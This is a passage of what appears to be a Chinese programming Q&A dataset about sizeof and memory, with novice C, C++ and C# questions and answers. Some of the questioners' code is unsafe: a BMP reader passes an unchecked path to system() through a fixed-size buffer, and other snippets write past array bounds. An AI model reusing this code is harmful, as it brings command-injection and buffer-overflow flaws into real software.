&& ext[1] == 'm' && ext[2] == 'p')) {", "\n    printf(\"Error(CheckPath): the extension of the file is not bmp.\\n\");", "\n    return -1;", "\n}", "\n\n", "//check whether the file can be read or not", "\nfd = fopen(path, \"r\");", "\nif (!fd)", "\n{", "\n    printf(\"Error(CheckPath): can not open the file.\\n\");", "\n    return -1;", "\n}", "\nfclose(fd);", "\n\n", "return 0;", "\n}", "\n", "\n", "void ShowImage(char * filepath)", "\n{", "\n    char cmd[266];", "\n    strcpy(cmd, \"start \");", "\n    strcat(cmd, filepath);", "\n    printf(\"%s\\n\", cmd);", "\n    system(cmd);", "\n}", "\n/**", "\n\n", "\n", "从文件中读取位图函数", "\n", "正确返回0，错误返回-1\n*", "\n", "使用方法：", "\n", "    bmp=(Bitmap*)malloc(sizeof(Bitmap));", "\n", "\n", "ret=ReadBitmap(path, bmp);\n", "\n\n", "/", "\nint ReadBitmap(char", " path, Bitmap* bmp)", "\n{", "\nint ret;", "\nFILE *fd;", "\n\n", "//检查路径是否可读", "\nret = CheckPath(path);", "\nif (ret == -1)", "\n{", "\n    printf(\"Error(ReadRGBBitmap): the path of the image is invalid.\\n\");", "\n    return -1;", "\n}", "\n\n", "ShowImage(path);", "\n//打开文件", "\nfd = fopen(path, \"rb\");", "\nif (fd == 0)", "\n{", "\n    printf(\"Error(ReadRGBBitmap): can not open the image.\\n\");", "\n    return -1;", "\n}", "\n//读取文件信息头14字节", "\nfread(&(bmp->bmfh.bfType), sizeof(WORD), 1, fd);", "\nfread(&(bmp->bmfh.bfSize), sizeof(DWORD), 1, fd);", "\nfread(&(bmp->bmfh.bfReserved1), sizeof(WORD), 1, fd);", "\nfread(&(bmp->bmfh.bfReserved2), sizeof(WORD), 1, fd);", "\nfread(&(bmp->bmfh.bfOffBits), sizeof(DWORD), 1, fd);", "\n\n", "//读取位图信息头40字节", "\nfread(&(bmp->bmih.biSize), sizeof(DWORD), 1, fd);", "\nfread(&(bmp->bmih.biWidth), sizeof(DWORD), 1, fd);", "\nfread(&(bmp->bmih.biHeight), sizeof(DWORD), 1, fd);", "\nfread(&(bmp->bmih.biPlanes), sizeof(WORD), 1, fd);", "\nfread(&(bmp->bmih.biBitCount), sizeof(WORD), 1, fd);", "\nfread(&(bmp->bmih.biCompression), sizeof(DWORD), 1, fd);", "\nfread(&(bmp->bmih.biSizeImage), sizeof(DWORD), 1, fd);", "\nfread(&(bmp->bmih.biXPelsPerMeter), sizeof(DWORD), 1, fd);", "\nfread(&(bmp->bmih.biYPelsPerMeter), sizeof(DWORD), 1, fd);", "\nfread(&(bmp->bmih.biClrUsed), sizeof(DWORD), 1, fd);", "\nfread(&(bmp->bmih.biClrImportant), sizeof(DWORD), 1, fd);", "\n\n", "//创建位图结构", "\nret = CreateBitmap(bmp, bmp->bmih.biWidth, bmp->bmih.biHeight, bmp->bmih.biBitCount);", "\nif (ret == -1)", "\n{", "\n    printf(\"Error(CreateBitmap): can not CreateBitmap.\\n\");", "\n    return -1;", "\n}", "\n//读取图像数据", "\n//由于4字节对齐格式", "\nfseek(fd, bmp->bmfh.bfOffBits, SEEK_SET);    //定位到图像数据区", "\nret = fread(bmp->imageData, bmp->imageSize, 1, fd);", "\nif (ret == 0)", "\n{", "\n    if (feof(fd))    //if the file pointer point to the end of the file", "\n    {", "\n    }", "\n    if (ferror(fd))  //if error happened while read the pixel data", "\n    {", "\n        printf(\"Error(ReadBitmap): can not read the pixel data.\\n\");", "\n        fclose(fd);", "\n        return -1;", "\n    }", "\n}", "\n//关闭文件", "\nfclose(fd);", "\nreturn 0;", "\n}", "\n", "\n", "/**", "\n\n", "\n", "保存位图到文件中去", "\n", "正确返回0，错误返回-1\n*", "\n", "使用方法：", "\n", "    bmp=(Bitmap*)malloc(sizeof(Bitmap));", "\n", "\n", "ret=SaveBitmap(path, bmp);\n", "\n\n", "/", "\nint SaveBitmap(char", " path, Bitmap* bmp, RGBQUAD *map = 0)", "\n{", "\nint ret = 0;", "\nFILE *fd;", "\n\n", "//检查路径是否正确", "\nint len = strlen(path) / sizeof(char);", "\nchar ext[3];", "\n//check whether the path include the characters \"bmp\" at end", "\nstrncpy(ext, &path[len - 3], 3);", "\nif (!(ext[0] == 'b' && ext[1] == 'm' && ext[2] == 'p'))", "\n{", "\n    printf(\"Error(SaveBitmap): the extension of the file is not bmp.\\n\");", "\n    return -1;", "\n}", "\n\n", "//打开文件", "\nfd = fopen(path, \"wb\");", "\nif (fd == 0)", "\n{", "\n    printf(\"Error(SaveBitmap): can not open the image.\\n\");", "\n    return -1;", "\n}", "\n\n", "//保存文件信息头     14字节", "\nfwrite(&(bmp->bmfh.bfType), sizeof(WORD), 1, fd);", "\nfwrite(&(bmp->bmfh.bfSize), sizeof(DWORD), 1, fd);", "\nfwrite(&(bmp->bmfh.bfReserved1), sizeof(WORD), 1, fd);", "\nfwrite(&(bmp->bmfh.bfReserved2), sizeof(WORD), 1, fd);", "\nfwrite(&(bmp->bmfh.bfOffBits), sizeof(DWORD), 1, fd);", "\n\n", "//保存位图信息头    40字节", "\nfwrite(&(bmp->bmih.biSize), sizeof(DWORD), 1, fd);", "\nfwrite(&(bmp->bmih.biWidth), sizeof(DWORD), 1, fd);", "\nfwrite(&(bmp->bmih.biHeight), sizeof(DWORD), 1, fd);", "\nfwrite(&(bmp->bmih.biPlanes), sizeof(WORD), 1, fd);", "\nfwrite(&(bmp->bmih.biBitCount), sizeof(WORD), 1, fd);", "\nfwrite(&(bmp->bmih.biCompression), sizeof(DWORD), 1, fd);", "\nfwrite(&(bmp->bmih.biSizeImage), sizeof(DWORD), 1, fd);", "\nfwrite(&(bmp->bmih.biXPelsPerMeter), sizeof(DWORD), 1, fd);", "\nfwrite(&(bmp->bmih.biYPelsPerMeter), sizeof(DWORD), 1, fd);", "\nfwrite(&(bmp->bmih.biClrUsed), sizeof(DWORD), 1, fd);", "\nfwrite(&(bmp->bmih.biClrImportant), sizeof(DWORD), 1, fd);", "\n\n", "//保存颜色表", "\nif (bmp->bmih.biBitCount == 8)", "\n{", "\n    ret = fwrite(map, sizeof(RGBQUAD) , 256, fd);", "\n}", "\nif (ret == -1)", "\n{", "\n    printf(\"Error(SaveBitmap): can not save Color Palette.\\n\");", "\n    return -1;", "\n}", "\n\n", "//保存图像数据", "\nret = fwrite(bmp->imageData, bmp->imageSize, 1, fd);", "\nif (ret != 1)", "\n{", "\n    printf(\"Error(SaveBitmap): can not save the pixel data.\\n\");", "\n    return -1;", "\n}", "\n\n", "//关闭文件", "\nfclose(fd);", "\nreturn 0;", "\n}", "\n", "\n", "int gray2ind(Bitmap* src, RGBQUAD ", "map, Bitmap", " dst)", "\n{", "\n\n", "int r ,m;\nCreateBitmap(dst, src->width, src->height, 8);\n\n\n//灰度数据缩放\nfor (int i = 0; i<dst->height; i++)\n{\n    for (int j = 0; j<dst->width; j++)\n    {\n        r = *(src->imageData + src->widthStep*(src->height - 1 - i) + j);\n        m = r / 16;\n\n        *(dst->imageData + dst->widthStep*(dst->height - 1 - i) + j) = m;\n\n\n    }\n}\nfor (int i = 0; i<16; ++i)    //调色板转换为0-1的小数\n{\ndouble gray = 0;\n\n    gray = i*0.0667;\n    (map + i)->rgbBlue = gray;\n    (map + i)->rgbRed = gray;\n    (map + i)->rgbGreen = gray;\n    (map + i)->rgbReserved = 0;\n\n}\n\nreturn 0;\n", "\n\n", "}", "\n\n", "#endif // BMP_H_INCLUDED", "\n\n", "\n", "\n\n", "\n"]], "Tag": "程序设计"}
{"Answer": "```\r\npublic static object BytesToStruct(byte[] bytes, int pos, Type strcutType)\r\n        {\r\n            int size = Marshal.SizeOf(strcutType);\r\n            IntPtr buffer = Marshal.AllocHGlobal(size);\r\n            try\r\n            {\r\n                Marshal.Copy(bytes, pos, buffer, size);\r\n                return Marshal.PtrToStructure(buffer, strcutType);\r\n            }\r\n            finally\r\n            {\r\n                Marshal.FreeHGlobal(buffer);\r\n            }\r\n        }\r\n\r\n        public static int SizeOf(Type strcutType)\r\n        {\r\n            return Marshal.SizeOf(strcutType);\r\n        }\r\n\r\n\r\n        bool InputTest(byte[] szInput, int ulInLen, byte[] szOutput, ref int ulLeftLen)\r\n        {\r\n            if (ulInLen &lt; SizeOf(typeof(StructA)))\r\n            {\r\n                ulLeftLen = SizeOf(typeof(StructA)) - ulInLen;\r\n                return false;\r\n            }\r\n            StructB b1 = (StructB)BytesToStruct(szInput, ulInLen - SizeOf(typeof(StructB)), typeof(StructB));\r\n            StructA pStructA = (StructA)BytesToStruct(szInput, 0, typeof(StructA));\r\n            StructC c = (StructC)BytesToStruct(szInput, SizeOf(typeof(StructA)), typeof(StructC));\r\n\r\n            Array.Copy(szInput, SizeOf(typeof(StructA)), szOutput, 0, SizeOf(typeof(StructD)));\r\n      \r\n            return true;\r\n        }\r\n```", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["C++方法转换成C#语言实现", ["新手求教", "\n以下C++函数，如何转化成C#实现？", "\n\n", "bool Input::InputTest(char* szInput, unsigned long ulInLen, char* szOutput, unsigned long &ulLeftLen)\n    {\n        if (ulInLen < sizeof(StructA))\n        {\n            ulLeftLen = sizeof(StructA) - ulInLen;\n            return false;\n        }\n        StructB* b1 = (StructB*)(&szInput[ulInLen - sizeof(StructB)]);\n        StructA* pStructA = (StructA*)szInput;\n        StructC* c = (StructC*)(szInput + sizeof(StructA));\n        memcpy(szOutput, szInput + sizeof(StructA), sizeof(StructD));\n        return true;\n    }\n"]], "Tag": "程序设计"}
{"Answer": "&lt;p&gt;主要原因是你最后循环中&amp;#xff0c;while其实没起到作用&amp;#xff0c;都在for循环中进行了。可for循环却没有有效的结束条件&amp;#xff0c;因为一旦i&amp;#61;&amp;#61;k&amp;#xff0c;你就会删除节点&amp;#xff0c;然后把j设置为1。其实这个for是个死循环。当节点都删除后&amp;#xff0c;你的 p和q还在移动&amp;#xff0c;自然就死掉了。&lt;br /&gt;修改也很简单&amp;#xff0c;在for循环的if(j&amp;#61;&amp;#61;k)的末尾增加while的条件判断&lt;br /&gt;&lt;span style=\"display:inline-block;text-indent:2em;\"&gt;                if(count &amp;#61;&amp;#61; num)&lt;/span&gt;&lt;br /&gt;&lt;span style=\"display:inline-block;text-indent:2em;\"&gt;                    break;&lt;/span&gt;&lt;br /&gt;即可。&lt;br /&gt;最后代码如下&amp;#xff1a;&lt;/p&gt;\n&lt;pre&gt;&lt;code class=\"language-javascript\"&gt;&lt;span class=\"hljs-comment\"&gt;#include &amp;lt;iostream&amp;gt;&lt;/span&gt;\nusing namespace std;\nstruct Node&lt;span class=\"hljs-regexp\"&gt;//&lt;/span&gt;结点类型\n{\n    int data; &lt;span class=\"hljs-regexp\"&gt;//&lt;/span&gt;数据域\n    Node* &lt;span class=\"hljs-keyword\"&gt;next&lt;/span&gt;; &lt;span class=\"hljs-regexp\"&gt;//&lt;/span&gt;指针域\n};\nint main()\n{\n    int num, k;&lt;span class=\"hljs-regexp\"&gt;//&lt;/span&gt;n为人数&amp;#xff0c;k为报数到几出列\n    cout &amp;lt;&amp;lt; &lt;span class=\"hljs-string\"&gt;&amp;#34;请输入参加游戏的人数&amp;#xff1a;&amp;#34;&lt;/span&gt;;\n    cin &amp;gt;&amp;gt; num;\n    cout &amp;lt;&amp;lt; &lt;span class=\"hljs-string\"&gt;&amp;#34;每报数到几出列&amp;#xff1a;&amp;#34;&lt;/span&gt;;\n    cin &amp;gt;&amp;gt; k;\n    struct Node* H &amp;#61; NULL, * r &amp;#61; NULL;&lt;span class=\"hljs-regexp\"&gt;//&lt;/span&gt;H是头指针&amp;#xff0c;r是尾指针&amp;#xff0c;都先赋初值为空\n    struct Node* p, * q;&lt;span class=\"hljs-regexp\"&gt;//&lt;/span&gt;用两个指针方便后面删除操作&amp;#xff0c;使q一直是p的前驱\n    &lt;span class=\"hljs-regexp\"&gt;//&lt;/span&gt;创建一个无头结点的循环单链表&amp;#xff0c;从尾部插入n个节点\n    &lt;span class=\"hljs-keyword\"&gt;for&lt;/span&gt; (int i &amp;#61; &lt;span class=\"hljs-number\"&gt;1&lt;/span&gt;; i &amp;lt;&amp;#61; num; i&amp;#43;&amp;#43;)\n    {\n        p &amp;#61; (struct Node*)malloc(sizeof(struct Node));\n        p-&amp;gt;data &amp;#61; i;\n        &lt;span class=\"hljs-keyword\"&gt;if&lt;/span&gt; (H &amp;#61;&amp;#61; NULL)&lt;span class=\"hljs-regexp\"&gt;//&lt;/span&gt;对于第一个节点的操作\n            H &amp;#61; r &amp;#61; p;&lt;span class=\"hljs-regexp\"&gt;//&lt;/span&gt;使头尾指针都指向第一个节点&amp;#xff0c;同时也固定了头指针\n        &lt;span class=\"hljs-keyword\"&gt;else&lt;/span&gt;&lt;span class=\"hljs-regexp\"&gt;//&lt;/span&gt;对于其他节点的操作\n        {\n            p-&amp;gt;&lt;span class=\"hljs-keyword\"&gt;next&lt;/span&gt; &amp;#61; H;&lt;span class=\"hljs-regexp\"&gt;//&lt;/span&gt;新增节点指向头指针&amp;#xff0c;实现循环\n            r-&amp;gt;&lt;span class=\"hljs-keyword\"&gt;next&lt;/span&gt; &amp;#61; p;\n            r &amp;#61; p;&lt;span class=\"hljs-regexp\"&gt;//&lt;/span&gt;新表尾替换旧表尾\n        }\n    }\n    p &amp;#61; H; q &amp;#61; r;&lt;span class=\"hljs-regexp\"&gt;//&lt;/span&gt;p指向第一个节点&amp;#xff0c;q指向表尾&amp;#xff0c;q一直做p前驱\n    int count &amp;#61; &lt;span class=\"hljs-number\"&gt;0&lt;/span&gt;;&lt;span class=\"hljs-regexp\"&gt;//&lt;/span&gt;记录出列人数\n    &lt;span class=\"hljs-keyword\"&gt;for&lt;/span&gt; (int j &amp;#61; &lt;span class=\"hljs-number\"&gt;1&lt;/span&gt;; j &amp;lt;&amp;#61; k;)\n    {\n        &lt;span class=\"hljs-keyword\"&gt;if&lt;/span&gt; (j !&amp;#61; k)\n        {\n            q &amp;#61; q-&amp;gt;&lt;span class=\"hljs-keyword\"&gt;next&lt;/span&gt;;\n            p &amp;#61; p-&amp;gt;&lt;span class=\"hljs-keyword\"&gt;next&lt;/span&gt;;\n            j&amp;#43;&amp;#43;;\n        }\n        &lt;span class=\"hljs-keyword\"&gt;if&lt;/span&gt; (j &amp;#61;&amp;#61; k)&lt;span class=\"hljs-regexp\"&gt;//&lt;/span&gt;报数到k删除节点\n        {\n            count&amp;#43;&amp;#43;;\n            q-&amp;gt;&lt;span class=\"hljs-keyword\"&gt;next&lt;/span&gt; &amp;#61; p-&amp;gt;&lt;span class=\"hljs-keyword\"&gt;next&lt;/span&gt;;\n            cout &amp;lt;&amp;lt; &lt;span class=\"hljs-string\"&gt;&amp;#34;第&amp;#34;&lt;/span&gt; &amp;lt;&amp;lt; count &amp;lt;&amp;lt; &lt;span class=\"hljs-string\"&gt;&amp;#34;个出列的人是&amp;#xff1a;&amp;#34;&lt;/span&gt; &amp;lt;&amp;lt; p-&amp;gt;data &amp;lt;&amp;lt; endl;\n            free(p);&lt;span class=\"hljs-regexp\"&gt;//&lt;/span&gt;删除p\n            &lt;span class=\"hljs-keyword\"&gt;if&lt;/span&gt;(count &amp;#61;&amp;#61; num)\n                &lt;span class=\"hljs-keyword\"&gt;break&lt;/span&gt;;\n            p &amp;#61; q-&amp;gt;&lt;span class=\"hljs-keyword\"&gt;next&lt;/span&gt;;&lt;span class=\"hljs-regexp\"&gt;//&lt;/span&gt;让p重新指向q的后继\n            j &amp;#61; &lt;span class=\"hljs-number\"&gt;1&lt;/span&gt;;\n        }\n    }\n    return &lt;span class=\"hljs-number\"&gt;0&lt;/span&gt;;\n}\n\n&lt;/code&gt;&lt;/pre&gt;", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["C++创建单循环链表写约瑟夫环问题报错内存访问权限冲突", ["创建循环单链表写约瑟夫环问题，一直报错0xDDDDDDDD", "源代码", "#include ", "using namespace std;", "struct Node//结点类型", "{", "    int data; //数据域", "    Node* next; //指针域", "};", "int main()", "{", "    int num, k;//n为人数，k为报数到几出列", "    cout << \"请输入参加游戏的人数：\";", "    cin >> num;", "    cout << \"每报数到几出列：\";", "    cin >> k;", "    struct Node* H = NULL, * r = NULL;//H是头指针，r是尾指针，都先赋初值为空", "    struct Node* p, * q;//用两个指针方便后面删除操作，使q一直是p的前驱", "    //创建一个无头结点的循环单链表，从尾部插入n个节点", "    for (int i = 1; i <= num; i++)", "    {", "        p = (struct Node*)malloc(sizeof(struct Node));", "        p->data = i;", "        if (H == NULL)//对于第一个节点的操作", "            H = r = p;//使头尾指针都指向第一个节点，同时也固定了头指针", "        else//对于其他节点的操作", "        {", "            p->next = H;//新增节点指向头指针，实现循环", "            r->next = p;", "            r = p;//新表尾替换旧表尾", "        }", "    }", "    p = H; q = r;//p指向第一个节点，q指向表尾，q一直做p前驱", "    int count = 0;//记录出列人数", "    while (count != num)//count=num代表所有人都出列", "    {", "        for (int j = 1; j <= k;)", "        {", "            if (j != k)", "            {", "                q = q->next;", "                p = p->next;", "                j++;", "            }", "            if (j == k)//报数到k删除节点", "            {", "                count++;", "                q->next = p->next;", "                cout << \"第\" << count << \"个出列的人是：\" << p->data << endl;", "                free(p);//删除p", "                p = q->next;//让p重新指向q的后继", "                j = 1;", "            }", "        }", "    }", "    return 0;", "}", "\n", "\n", "报错："]], "Tag": "程序设计"}
{"Answer": "&lt;p&gt;S2数组就定义了4个字节。strcat都是溢出了&lt;br /&gt;假设你写成char s2[100] &amp;#61; &amp;#34;aaa&amp;#34;;&lt;br /&gt;那sizeof(s2)就是100了&lt;/p&gt;", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["用strcat连接后数组的大小问题", ["\n", "#include<stdio.h>", "\n", "#include<string.h>", "\n", "int", " main(void）\n{\n    char s1[]=", "\"bbbbbbb\"", ";\n    char s2[]=", "\"aaa\"", ";\n    strcat(s2,s1);\n    ", "printf", "(", "\"s1=%s\\n\"", ",s1);\n    ", "printf", "(", "\"s2=%s\\n\"", ",s2);\n    ", "printf", "(", "\"sizeof(s1)=%d,strlen(s1)=%d\\n\"", ",sizeof(s1),strlen(s1));\n    ", "printf", "(", "\"sizeof(s2)=%d,strlen(s2)=%d\\n\"", ",sizeof(s2),strlen(s2));\n    ", "return", " ", "0", ";\n}\n\n", "\n", "为啥sizeof(s2)是4啊？", "我感觉应该是11"]], "Tag": "程序设计"}
{"Answer": "函数的重载嘛，是为了适应调用者的各种需要，简化调用者的操作；\r\n要解释清楚是些什么函数 就有点麻烦了  看下这个吧\r\nhttps://www.cnblogs.com/maowang1991/p/3571483.html\r\nhttps://baike.baidu.com/item/LPCSTR/4537603?fr=aladdin\r\n跟具体的编译环境还有些关系的", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["LPCWSTR 、LPCSTR 、 BYTE *   三种返回值对函数的区别？", ["有一个接口，功能一致，就是返回值类型不同，请问这几种返回值类型接口的处理方式有什么区别？比如是UNICODE函数还是ASCII函数？", "\nLPCSTR A（）", "\n{", "\n        m_localFileData = new char[ fLength * sizeof(char) + 1 ];", "\n        memset( m_localFileData , 0 , fLength * sizeof(char) + 1 );", "\n}", "\n\n", "LPCWSTR A（）", "\n{", "\n        m_localFileDataW = new WCHAR[ fLength * sizeof(WCHAR) + 1 ];", "\n        char* temp = NULL;", "\n        temp = new char[fLength * sizeof(char) + 1];", "\n        memset( m_localFileDataW , 0 , fLength * sizeof(WCHAR) + 1 );", "\n        MultiByteToWideChar( CP_ACP , 0 , temp , strlen(temp) , m_localFile  DataW , sizeof(m_localFileDataW) );", "\n}", "\n\n", "BYTE * A（）", "\n{", "\n        m_localFileDataB = new BYTE[ fLength * sizeof(BYTE) ];", "\n        memset( m_localFileDataB , 0 , fLength * sizeof(BYTE) );", "\n}"]], "Tag": "程序设计"}
{"Answer": "&lt;p&gt;本身写错了 &amp;#xff05;d后面要再加一个参数。因为你没加运行的行为不可预知。比如 printf(&amp;#34;%d&amp;#34;,sizeof(int));一个坑一个参数&lt;/p&gt;", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["为什么会出现这两种情况啊，这样写不对吗？应该怎么改啊", ["\n", "这两种情况怎么回事啊，不应该这样写吗?怎么用sizeof来计算数据类型啊?"]], "Tag": "程序设计"}
{"Answer": "```\r\n struct Student st[] = { {\"aaa\",25,1},{\"bbb\",40,0}, {\"ccc\",30,1},{\"ddd\",34,1},{\"eee\",79,0} };  数组初始化时就是[5],数组下标是 0 - 4\r\n \r\n if (st[j].age &gt; st[j + 1].age)  //可以实现年龄从小到大。。\r\n \r\n\r\n \r\n```", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["C语言 struct结构体 发现的一个问题 百思不得其解，求大神为我解惑", ["代码如下", "\n\n", "#define _CRT_SECURE_NO_WARNINGS//vs报scanf警告\n#include<stdio.h>\n#include<string.h>\n\nstruct Student\n{\n    char name[20];\n    char age;\n    char sex;\n};\nint main() {\n    struct Student st[] = { {\"aaa\",25,1},{\"bbb\",40,0}, {\"ccc\",30,1},{\"ddd\",34,1},{\"eee\",79,0} };//声明且初始化\n    int num = sizeof(st) / sizeof(st[0]);//计算出成员数量\n    printf(\"%d\\n\", sizeof(st));//这里输出结构体数组st所占的内存大小，这里是110byte，5个成员，每个成员22byte\n    for (int i = 0; i < num; i++)//冒泡排序，以年龄排序\n    {\n        for (int j = 0; j < num - i; j++)\n        {\n            if (st[j].age > st[j + 1].age)\n            {\n                st[num] = st[j];//这里我突发奇想把大的放置在数组后面，程序运行起来没问题，不知道实际上能不能这样？？？\n                st[j] = st[j + 1];\n                st[j + 1] = st[num];\n            }\n        }\n    }\n    scanf(\"%20s\", st[5].name);//向数组添加新成员\n    scanf(\"%d\", &st[5].age);\n    scanf(\"%d\", &st[5].sex);\n    num = sizeof(st) / sizeof(st[0]);//问题来了！这里怎么还是5，不是6呢？？？？那怎么输出新成员的信息呢？？？\n    printf(\"%d\\n\", sizeof(st));\n    for (int i = 0; i < num;i++)\n    {\n        printf(\"%s,%d,%d\\n\", st[i].name, st[i].age, st[i].sex);\n    }\n    return 0;\n}\n\n"]], "Tag": "程序设计"}
{"Answer": "&lt;p&gt;先说第一个&amp;#xff0c;sizeof(a)不是指整个数组地址&amp;#xff0c;而是指这个二维数组所占内存的大小&amp;#xff0c;因为你的是int整型数组&amp;#xff0c;每个整型占4个字节&amp;#xff0c;一共9个元素&amp;#xff0c;所以占36个字节&amp;#xff1b;&lt;br /&gt;\n再说sizeof(&amp;amp;a)&amp;#xff0c;这个求解的是数组a所在的地址占的内存大小&amp;#xff0c;这里你可以理解成指针&amp;#xff0c;因为指针的本质就是地址&amp;#xff0c;你可以去百度查&amp;#xff0c;规定指针类型的内存大小为你使用的计算机的位数所占的字节&amp;#xff0c;这里我猜测你的电脑应该是32位即4字节的&amp;#xff0c;所以显示为4&amp;#xff1b;我的电脑使用64位&amp;#xff0c;所以显示为8&amp;#xff1b;&lt;br /&gt;\n再来说a[0]、&amp;amp;a[0]、a、&amp;amp;a的地址关系&amp;#xff0c;数组在C语言中是顺序排列的&amp;#xff0c;所以最开始的元素不就是a[0][0]吗&amp;#xff0c;同时这个元素所占的地址不也是整个数组的起始地址a吗&amp;#xff0c;同时c语言里面数组名是可以当地址使用的&amp;#xff0c;&amp;amp;a的地址即为a的地址。a[0]是二维数组的第一个一位数组&amp;#xff0c;那么它即是一个数组名&amp;#xff0c;也可以当做地址使用。&lt;br /&gt;\n这些地址都是对的&amp;#xff0c;你用哪个都可以&amp;#xff0c;具体使用哪个无非是看你题目的要求。你的a[0]&amp;#43;1和&amp;amp;a[0][1]都是指元素a[0][1]所在的地址&amp;#xff0c;所以地址显示相同&lt;br /&gt;\n这里特别重要的知识点就是&amp;#xff0c;当有&amp;amp;或者*符号时&amp;#xff0c;都是当做指针来计算&amp;#xff0c;指针的大小与你的类型、长度无关&amp;#xff0c;只与你的操作系统所占位数有关&lt;br /&gt;\n &lt;/p&gt;", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["【二维数组问题】二维数组名含义问题", ["一直没搞懂二维数组名含义以及延申的各种地址问题，在网上搜集相关资料发现很多是这样讲的：假设一个二维数组a[3][3]", "\n\n", "a代表首行地址，一般用a[0][0]地址表示；", "\n\n", "&a代表整个数组的地址，一般用a[0][0]地址表示；", "\n\n", "a[i]代表第i行起始元素的地址；", "\n\n", "&a[i]代表第i行的地址，一般用a[i][0]地址表示；", "\n\n", "但是我自己写了段代码求证发现并不是这样", "\n\n", "\n", "#include <iostream>\nusing namespace std;\nint main()\n{\n\tint a[3][3] = {\n\t\t{1, 2, 3},\n\t\t{4, 5, 6},\n\t\t{7, 8, 9}\n\t};\n\tcout << \"sizeof(a): \" << sizeof(a) << \" address: \" << a << endl;\n\tcout << \"sizeof(&a): \" << sizeof(&a) << \" address: \" << &a << endl;\n\tcout << \"sizeof(a[0]): \" << sizeof(a[0]) << \" address: \" << a[0] << endl;\n\tcout << \"sizeof(&a[0]): \" << sizeof(&a[0]) << \" address: \" << &a[0] << endl;\n\tcout << \"sizeof(a[0] + 1): \" << sizeof(a[0] + 1) << \" address: \" << a[0] + 1 << endl;\n\tcout << \"sizeof(&a[0][1]): \" << sizeof(&a[0][1]) << \" address: \" << &a[0][1] << endl;\n\tsystem(\"pause\");\n\treturn 0;\n}", "\n\n", "输出如下：", "\n\n", "\n\n", "可以看到sizeof(a)有36字节，显然是整个数组地址的意思。但是不知道为什么sizeof(&a)为什么只有4？还有a[0]和&a[0]，按照输出，a[0]应该表示第0行这一整行的地址，&a[0]应该是第0行首元素的地址？哪个才是对的，到底该听哪个的呢？"]], "Tag": "程序设计"}
{"Answer": "&lt;pre&gt;\n&lt;code class=\"language-cpp\"&gt;char* pop(struct LLNode *head)\n{\n    struct LLNode *temp;\n    char *val &amp;#61; (char *)malloc(5*sizeof(char));\n    //strcpy(head-&amp;gt;next-&amp;gt;ID, val);\n\t\n    strcpy( val,head-&amp;gt;next-&amp;gt;ID);\n    temp &amp;#61; head-&amp;gt;next;\n    head-&amp;gt;next &amp;#61; head-&amp;gt;next-&amp;gt;next;\n    free(temp);\n    return val;\n}&lt;/code&gt;&lt;/pre&gt;\n\n&lt;p&gt;拷贝反了。&lt;/p&gt;\n\n&lt;p&gt;&lt;img alt=\"\" height=\"176\" src=\"https://img-ask.csdnimg.cn/upload/1622521657127.png\" width=\"283\" /&gt;&lt;/p&gt;", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["C语言为什么输出出栈的字符串时会输出乱码如0xz，是因为没有正确分配内存吗？希望大佬们解答", ["\n", "#include<stdio.h>\n#include<stdlib.h>\n#include<string.h>\nstruct LLNode\n{\n    char ID[5];\n    struct LLNode *next;\n};\n\nstruct LLNode * createNode(char val[5]) \n{\n    struct LLNode *temp;\n    temp=(struct LLNode *)malloc(sizeof(struct LLNode));\n    temp->next=NULL;\n    strcpy(temp->ID, val);\n    return temp;\n};\n\nvoid push(char* val, struct LLNode *head)\n{\n    struct LLNode *temp;\n    temp = createNode(val);\n    temp->next = head->next;\n    head->next = temp;\n}\n\nchar* pop(struct LLNode *head)\n{\n    struct LLNode *temp;\n    char *val = (char *)malloc(5*sizeof(char));\n    strcpy(head->next->ID, val);\n    temp = head->next;\n    head->next = head->next->next;\n    free(temp);\n    return val;\n}\n\nchar nothing(struct LLNode *head, struct LLNode *tail)\n{\n    if(head->next == NULL) \n        return 1;\n    else\n        return 0;\n}\n\nint main()\n{\n    char* value = (char *)malloc(5*sizeof(char));\n    struct LLNode *head = NULL;\n    struct LLNode *tail = NULL;\n\n    head = createNode(\"\");\n    tail = createNode(\"\");\n\n    head->next = tail;\n    printf(\"head->ID = %s\\n\", head->ID);\n\n    push (\"C201\", head);\n    printf(\"head->next->ID = %s\\n\",head->next->ID) ;  \n\n    push (\"C202\", head);\n    printf(\"head->next->ID = %s\\n\",head->next->ID) ;  \n\n    push (\"C203\", head);\n    printf(\"head->next->ID = %s\\n\",head->next->ID) ;  \n\n    push (\"C204\", head);\n    printf(\"head->next->ID = %s\\n\",head->next->ID) ;  \n\n    push (\"C205\", head);\n    printf(\"head->next->ID = %s\\n\",head->next->ID) ;  \n    \n    for (int i=0; i<3; i++)\n    {\n        value = (char *)malloc(5*sizeof(char));\n        strcpy(value, pop(head));\n        printf(\"The value pop = %s\\n\", value);\n        printf(\"head->next->ID= %s\\n\",head->next->ID);\n        free(value);\n    }\n    \n    if (nothing(head,tail))\n        printf(\"The stack is empty\");\n\n    printf(\"Remaining IDs:\");\n    struct LLNode *curr = head;\n    while (curr) \n    {\n        printf(\"%s \",curr->ID);\n        curr = curr->next;\n    }\n    return 0;\n}", "\n\n", "输出：", "\n\n", "\n\n", " "]], "Tag": "程序设计"}
{"Answer": "根据结构体大小，分配空间，然后给对应的两个变量赋值", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["在搜索蓝牙设备时，初始化蓝牙枚举结构", ["DWORD dwWsaqsLen = sizeof(WSAQUERYSET);", "\nLPWSAQUERYSET lpWsaqs = (LPWSAQUERYSET)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwWsaqsLen); ", "\nlpWsaqs->dwSize = sizeof(WSAQUERYSET);", "\nlpWsaqs->dwNameSpace = NS_BTH; ", "\n请大神帮我解析下这段代码，初学者，急急急，拜托啦"]], "Tag": "程序设计"}
